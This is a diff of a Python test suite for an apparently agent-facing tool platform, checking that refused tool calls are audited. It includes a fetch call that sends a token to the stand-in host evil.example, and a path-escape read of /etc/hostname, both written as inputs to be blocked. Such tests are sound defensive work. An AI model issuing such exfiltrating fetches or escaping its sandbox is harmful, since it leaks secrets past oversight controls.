@@ -594,12 +594,7 @@ class TestRefusedCallsAreAudited:
         assert "tool=read" in detail and "kind=path_escape" in detail
         assert "path='/etc/hostname'" in detail
 
-    def test_a_fetch_off_the_allowlist_is_audited_once(
-        self, ctx: ToolContext, monkeypatch: pytest.MonkeyPatch
-    ) -> None:
-        from docket.platform import fetch as fetch_mod
-
-        monkeypatch.setattr(fetch_mod, "allowed_domains", lambda: frozenset({"ok.example"}))
+    def test_a_fetch_off_the_allowlist_is_audited_once(self, ctx: ToolContext) -> None:
         with use_home(dataclasses.replace(current_home(), fetch_allowed_domains=("ok.example",))):
             url = json.dumps({"url": "https://evil.example/x?token=SECRETQ"})
             dispatch_tool(_call("fetch", url), ctx, builtin_registry())
